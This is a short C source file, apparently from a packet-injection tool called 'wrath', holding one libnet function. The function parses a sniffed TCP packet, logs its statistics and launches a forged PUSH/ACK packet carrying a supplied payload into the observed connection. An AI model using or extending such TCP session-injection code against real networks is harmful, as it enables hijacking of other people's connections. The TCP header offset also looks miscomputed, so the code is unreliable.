#include <libnet.h>
#include "wrath-builders.h"
#include "wrath-structs.h"

void wrath_launch_generic(u_char *data_pass, const u_char *packet, u_char *payload, int ack_increment, FILE *logfp) {

	struct lcp_package *package = (struct lcp_package *) data_pass;
	libnet_t *libnet_handle = package->libnet_handle;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
	
	wrath_capture_stats(iphdr, tcphdr, logfp);
	wrath_attack_packet_stats(iphdr, tcphdr, (TH_PUSH + TH_ACK), strlen(payload), logfp);

	/* launches forged packet */
	wrath_tcp_belly_build_and_launch(data_pass, packet, payload, ack_increment, (TH_PUSH + TH_ACK));
}
